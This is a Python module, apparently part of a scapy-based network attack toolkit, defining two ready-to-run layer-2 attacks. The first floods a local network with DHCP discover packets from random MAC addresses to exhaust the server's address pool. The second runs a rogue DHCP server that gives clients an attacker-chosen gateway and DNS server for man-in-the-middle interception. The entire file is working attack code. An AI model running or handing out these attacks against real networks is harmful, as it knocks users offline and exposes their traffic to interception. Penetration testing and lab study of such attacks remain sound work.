import logging
from libs.aux_funcs import type_wrapper, attack_cat, attack_type, attack_layer, send_l2_single
from scapy.layers.dhcp import BOOTP, DHCP, BOOTP_am
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether, Dot3
from scapy.sendrecv import sendp
from scapy.all import RandMAC, Net


@type_wrapper(category = attack_cat.Attack, name = "DHCP Starvation", type = attack_type.DoS, layer = attack_layer.L2, arg_list=[])
def dhcp_starve(args):
    """Performs a DHCP Starvation attack in the local network. Requires no additional arguments."""
    logging.debug("Starting DHCP Starvation...")
    while True:
        mac = str(RandMAC())    # Generate random MAC address
        chaddr = ''.join([chr(int(x,16)) for x in mac.split(":")]) # Format MAC address to the 'chaddr' field format used by scapy

        pkt = Ether(dst = "ff:ff:ff:ff:ff:ff", src = mac)/\
                IP(dst = "255.255.255.255", src = "0.0.0.0")/\
                UDP(dport = 67, sport = 68)/\
                BOOTP(chaddr=chaddr)/\
                DHCP(options = [("message-type", "discover"), "end"])

        sendp(pkt, iface=args['iface'])

@type_wrapper(category = attack_cat.Attack, name = "DHCP Spoofing", type = attack_type.MitM, layer = attack_layer.L2, arg_list=['pool', 'network', 'domain', 'gw', 'server_id', 'dns', 'lease_time', 'renewal_time'])
def dhcp_spoof(args):

    """Perform a DHCP Spoofing attack. Requires several arguments:
    arg             desc                        example value
    pool            DHCP pool                   192.168.1.128/25
    network         Base network address        192.168.1.0/24
    domain          Network domain name         localnet
    gw              Gateway IP address          192.168.1.1
    server_id       DHCP Server IP address      192.168.1.1
    dns             DNS Server IP address       192.168.1.1
    renewal_time    DHCP renewal time in secs   60
    lease_time      DHCP lease time in secs     1800"""

    # Auxiliary classes. Override selected methods from the parent class to include extra arguments
    class BOOTP_am_en(BOOTP_am):
        def parse_options(self, pool=Net("192.168.1.128/25"), network="192.168.1.0/24", gw="192.168.1.1",\
            domain="localnet", renewal_time=60, lease_time=1800, server_id = "192.168.1.1", dns = "192.168.1.1"):

            self.server_id = server_id
            self.dns = dns
            super().parse_options(pool, network, gw, domain, renewal_time, lease_time)
            # Remove dns and server_id addresses from DHCP pool if needed
            self.pool = [x for x in self.pool if x not in (dns, server_id)]     

    # NOTE: Original DHCP_am class inherits from BOOTP_am.
    #  Since it now needs to inherit from BOOTP_am_en, the make_reply method needs to be redefined.
    #  The method code is a mirror of the original DHCP_am code, modified to work with the BOOTP_am_en class
    #  Original code can be found at https://github.com/secdev/scapy/blob/master/scapy/layers/dhcp.py#L643-L663
    class DHCP_am_en(BOOTP_am_en):
        function_name = "dhcpd"

        def make_reply(self, req):
            resp = BOOTP_am_en.make_reply(self, req)
            if DHCP in req:
                dhcp_options = [(op[0], {1: 2, 3: 5}.get(op[1], op[1]))
                            for op in req[DHCP].options
                            if isinstance(op, tuple) and op[0] == "message-type"]  # noqa: E501
            dhcp_options += [("server_id", self.server_id),
                             ("domain", self.domain),
                             ("router", self.gw),
                             ("name_server", self.gw),
                             ("domain_server", self.dns),
                             ("broadcast_address", self.broadcast),
                             ("subnet_mask", self.netmask),
                             ("renewal_time", self.renewal_time),
                             ("lease_time", self.lease_time),
                             "end"]
            resp /= DHCP(options=dhcp_options)
            return resp


    # Input arguments to answer machine
    dhcp_server = DHCP_am_en(iface=args['iface'],\
                                pool = Net(args['pool']),\
                                network = args['network'],\
                                domain = args['domain'],\
                                gw = args['gw'],\
                                renewal_time = int(args['renewal_time']),\
                                lease_time = int(args['lease_time']),\
                                server_id = args['server_id'],\
                                dns = args['dns'])

    # Start the attack
    try:
        logging.debug("Starting DHCP spoofing")
        print("Server listening.")
        dhcp_server()
    except KeyboardInterrupt:
        logging.debug("Stopping DHCP spoofing")

    pass